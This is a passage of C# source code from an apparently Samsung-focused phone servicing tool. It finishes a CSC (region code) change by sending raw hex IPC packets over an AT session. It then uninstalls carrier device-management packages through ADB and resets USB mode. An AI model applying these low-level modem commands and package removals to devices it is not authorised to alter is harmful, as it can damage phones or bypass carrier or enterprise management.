            Log($"OUT -> [IPC 1/5]: {pkt1}");
            string resp1 = await _atSession.SendIpcHexCommandAsync(pkt1, cancellationToken);
            Log($"IN <- [IPC 1/5 Response]: .OK..{resp1}#");

            // Packet 2: 060100090000{hexCsc}
            string pkt2 = $"060100090000{hexCsc}";
            Log($"OUT -> [IPC 2/5]: {pkt2}");
            string resp2 = await _atSession.SendIpcHexCommandAsync(pkt2, cancellationToken);
            Log($"IN <- [IPC 2/5 Response]: .OK..{resp2}#");

            // Packet 3: 060100120000{hexCsc}0000{hexCsc}{hexCsc}
            string pkt3 = $"060100120000{hexCsc}0000{hexCsc}{hexCsc}";
            Log($"OUT -> [IPC 3/5]: {pkt3}");
            string resp3 = await _atSession.SendIpcHexCommandAsync(pkt3, cancellationToken);
            Log($"IN <- [IPC 3/5 Response]: .OK..{resp3}#");

            // Packet 4: 060100120000
            string pkt4 = "060100120000";
            Log($"OUT -> [IPC 4/5]: {pkt4}");
            string resp4 = await _atSession.SendIpcHexCommandAsync(pkt4, cancellationToken);
            Log($"IN <- [IPC 4/5 Response]: .OK..{resp4}#");

            // Packet 5: 060100090000{hexCsc}
            string pkt5 = $"060100090000{hexCsc}";
            Log($"OUT -> [IPC 5/5]: {pkt5}");
            string resp5 = await _atSession.SendIpcHexCommandAsync(pkt5, cancellationToken);
            Log($"IN <- [IPC 5/5 Response]: .OK..{resp5}#");

            await _atSession.TerminateSessionAsync(cancellationToken);

            // Step 13: Post-Cleanup (33.txt line 149)
            ReportProgress(13, 14, "Cleanup", "Executing post-change package cleanup (33.txt line 149)...");
            string cleanupCmd = "pm uninstall -k --user 0 com.sec.android.AutoPreconfig;pm uninstall -k --user 0 com.sec.omadmspr;pm clear com.samsung.android.app.mobiledoctor";
            Log($"OUT -> shell:{cleanupCmd}");
            string cleanupResp = await _adbClient.ExecuteShellCommandAsync(cleanupCmd, false, cancellationToken);
            Log($"IN <- {cleanupResp.Trim()}");

            // Step 14: USB Mode Reset (33.txt line 152)
            ReportProgress(14, 14, "USB Reset", "Sending direct ADB protocol USB reset (0004usb:)...");
            Log("OUT -> 0004usb:");
            string usbResetResp = await _adbClient.RestartUsbModeAsync(cancellationToken);
            Log($"IN <- {usbResetResp}");

            sw.Stop();
            ReportProgress(14, 14, "Complete", $"Method 2: CSC successfully changed from {oldCsc} to {cleanCsc} in {sw.Elapsed.TotalSeconds:F2}s.");

            return new CscChangeResult(
                Success: true,
                OldCsc: oldCsc,
                NewCsc: cleanCsc,
                Message: $"Method 2: CSC successfully changed to {cleanCsc} in {sw.Elapsed.TotalSeconds:F1}s.",
                Duration: sw.Elapsed,
                ExecutionLog: executionLog
            );
        }
        catch (Exception ex)
        {
            sw.Stop();
            Log($"ERROR: Method 2 workflow failed: {ex.Message}");
            return new CscChangeResult(
                Success: false,
                OldCsc: "Unknown",
                NewCsc: targetCsc,
                Message: $"Method 2 workflow failed: {ex.Message}",
                Duration: sw.Elapsed,
                ExecutionLog: executionLog
            );
        }
    }

    public static string FindArtifactPath(string fileName, string? customDir = null)
    {
        var candidates = new List<string>();

        if (!string.IsNullOrWhiteSpace(customDir))
        {
            candidates.Add(Path.Combine(customDir, fileName));
        }

        candidates.Add(Path.Combine(@"C:\Users\pc5\Documents\GitHub\gsmtools\2", fileName));
        candidates.Add(Path.Combine(AppContext.BaseDirectory, "2", fileName));
        candidates.Add(Path.Combine(Directory.GetCurrentDirectory(), "2", fileName));
        candidates.Add(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "2", fileName));
        candidates.Add(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "2", fileName));

        foreach (var path in candidates)
        {
            string full = Path.GetFullPath(path);
            if (File.Exists(full))
                return full;
        }

        // Fallback for ADP.xml if ASKSW.xml exists
        if (fileName.Equals("ADP.xml", StringComparison.OrdinalIgnoreCase))
        {
            try
            {
                string askswPath = FindArtifactPath("ASKSW.xml", customDir);
                return askswPath;
            }
            catch
            {
                // ignore
            }
        }

        throw new FileNotFoundException($"Could not find required Method 2 artifact '{fileName}'. Ensure folder '2' exists with all required files.");
    }

    private static string FindLocalAtBinary()
    {
        string[] candidates = new[]
        {
            Path.Combine(AppContext.BaseDirectory, "AT"),
            Path.Combine(Directory.GetCurrentDirectory(), "AT"),
            Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "AT"),
            Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "AT"),
            Path.Combine(Directory.GetCurrentDirectory(), "at-bridge", "libs", "arm64-v8a", "AT"),
            Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "at-bridge", "libs", "arm64-v8a", "AT")
        };

        foreach (var path in candidates)
        {
            string full = Path.GetFullPath(path);
            if (File.Exists(full))
                return full;
        }

        throw new FileNotFoundException("Could not find local compiled AT binary. Ensure 'AT' exists in output or repository root.");
    }

    private static Dictionary<string, string> ParseGetProp(string rawOutput)
    {
        var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        var matches = Regex.Matches(rawOutput, @"\[(?<key>[^\]]+)\]:\s*\[(?<val>[^\]]*)\]");
        foreach (Match m in matches)
        {
            dict[m.Groups["key"].Value.Trim()] = m.Groups["val"].Value.Trim();
        }
        return dict;
    }

    private static string GetPropValue(Dictionary<string, string> props, string key, string fallback)
    {
        return props.TryGetValue(key, out string? val) && !string.IsNullOrWhiteSpace(val) ? val : fallback;
    }

    private static string ExtractVersion(string rawOutput)
    {
        if (string.IsNullOrWhiteSpace(rawOutput))
            return "Not Installed";

        var match = Regex.Match(rawOutput, @"versionName=(?<ver>[^\s\r\n]+)");
        if (match.Success)
            return match.Groups["ver"].Value;

        var codeMatch = Regex.Match(rawOutput, @"versionCode=(?<code>\d+)");
        if (codeMatch.Success)
            return $"Code: {codeMatch.Groups["code"].Value}";

        return rawOutput.Trim().Length > 50 ? rawOutput.Trim().Substring(0, 50) + "..." : rawOutput.Trim();
    }
}
